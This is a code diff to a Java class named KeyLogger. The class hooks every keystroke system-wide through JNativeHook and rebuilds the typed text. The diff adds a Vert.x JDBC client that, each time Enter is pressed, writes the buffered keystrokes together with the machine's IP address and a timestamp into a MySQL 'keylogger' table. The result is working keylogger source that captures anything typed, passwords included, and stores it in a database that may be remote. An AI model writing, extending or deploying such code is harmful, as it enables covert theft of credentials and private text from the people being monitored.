@@ -1,6 +1,8 @@
 package tools;
 
 
+import java.net.Inet4Address;
+import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.logging.Level;
@@ -12,6 +14,19 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
+import org.joda.time.DateTime;
+import org.quartz.InterruptableJob;
+import org.quartz.JobExecutionContext;
+import org.quartz.JobExecutionException;
+import org.quartz.UnableToInterruptJobException;
+
+import com.mysql.jdbc.Connection;
+
+import io.vertx.core.Vertx;
+import io.vertx.core.json.JsonArray;
+import io.vertx.core.json.JsonObject;
+import io.vertx.ext.jdbc.JDBCClient;
+import io.vertx.ext.sql.SQLConnection;
 
 public class KeyLogger implements NativeKeyListener {
 	
@@ -19,8 +34,16 @@ public class KeyLogger implements NativeKeyListener {
 	private ArrayList<String> typed;
 	private String data;
 	private HashMap<Integer, String> keyword = new HashMap<>();
+	private Vertx vertx;
+	private JDBCClient jdbc;
+	private SQLConnection connection;
+	private String IP;
 	
-	public KeyLogger(DBConfig conf) {
+	
+	
+	
+	public KeyLogger(DBConfig conf,Vertx v) {
+		vertx = v;
 		// TODO Auto-generated constructor stub
 		keyword.put(NativeKeyEvent.VC_0,"0");
     	keyword.put(NativeKeyEvent.VC_1,"1");
@@ -61,7 +84,21 @@ public class KeyLogger implements NativeKeyListener {
     	keyword.put(NativeKeyEvent.VC_SPACE," ");
     	keyword.put(NativeKeyEvent.VC_COMMA, ",");
     	keyword.put(NativeKeyEvent.VC_PERIOD,".");
-	
+    	
+    	
+    	try {
+			IP = Inet4Address.getLocalHost().getHostAddress();
+		} catch (UnknownHostException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+    	 
+    	jdbc = JDBCClient.createShared(vertx, new JsonObject()
+				.put("url",conf.getConnectionURL())
+				.put("driver_class","com.mysql.jdbc.Driver")
+				.put("user",conf.getDbUser())
+				.put("password",conf.getDbPassword())
+				);
 	}
 	
 	
@@ -70,8 +107,14 @@ public class KeyLogger implements NativeKeyListener {
         //System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
         int code = e.getKeyCode();
         String val =parser(e.getKeyCode()); 
-        if ( val!=null)
+        if ( val!=null){
         	data += val;
+        	
+        	if(code == NativeKeyEvent.VC_ENTER){
+        		store(data);
+        		data ="";
+        	}
+        }
         
         
         
@@ -91,6 +134,25 @@ public class KeyLogger implements NativeKeyListener {
         }
     }
 
+	private void store(String data) {
+		// TODO Auto-generated method stub
+		jdbc.getConnection(res -> {
+			  if (res.succeeded()) {
+				    SQLConnection conn = res.result();
+				    DateTime time = DateTime.now();
+				    conn.updateWithParams("INSERT INTO keylogger(ip,date,data) VALUES (?, ?, ?)", new JsonArray().add(IP).add(time).add(data), resa -> {
+				    	  if (resa.succeeded()) {
+				    	    System.out.println("Added keylog");
+				    	    conn.close();
+				    	  }
+				 }); 
+			  }
+		});
+		
+		
+	}
+
+
 	private String parser(int keyCode) {
 		// TODO Auto-generated method stub
 		String value = keyword.get(keyCode);
@@ -98,9 +160,6 @@ public class KeyLogger implements NativeKeyListener {
 		
 	}
 	
-	
-	
-
 	@Override
     public void nativeKeyReleased(NativeKeyEvent e) {
        // System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
@@ -125,6 +184,6 @@ public class KeyLogger implements NativeKeyListener {
             System.exit(1);
         }
 
-        GlobalScreen.addNativeKeyListener(new KeyLogger(null));
+        GlobalScreen.addNativeKeyListener(new KeyLogger(null,null));
     }
 }
